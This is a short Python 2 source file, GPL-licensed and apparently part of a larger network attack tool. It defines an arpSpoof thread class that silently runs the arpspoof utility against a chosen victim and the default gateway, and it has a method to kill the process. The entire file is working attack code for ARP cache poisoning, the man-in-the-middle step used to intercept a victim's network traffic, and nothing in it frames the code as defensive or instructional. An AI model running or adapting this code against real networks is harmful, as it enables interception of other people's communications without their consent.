# Copyright (c) 2013 KernelSanders
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import threading
import os
import subprocess
import shlex
import signal
from nmapRunner import setDefaultGatewayAndInterface

DEVNULL = open('/dev/null', 'w')

class arpSpoof(threading.Thread):
    def __init__(self, victim):
        self.victim = victim
        self.router, self.iface = setDefaultGatewayAndInterface()
        super(arpSpoof,self).__init__()

    def run(self):
        self.p1 = subprocess.Popen(shlex.split('arpspoof -i ' + self.iface + ' -t ' + self.victim + ' ' + self.router), stdout=DEVNULL, stderr=DEVNULL, preexec_fn=os.setsid)

    def stop(self):
        try:
            os.kill(self.p1.pid, signal.SIGTERM) 
            self.p1.terminate()
        except:
            print 'No process for ' + self.victim
        #os.kill(self.p1.pid,signal.SIGKILL)
        super(arpSpoof,self).join(None)
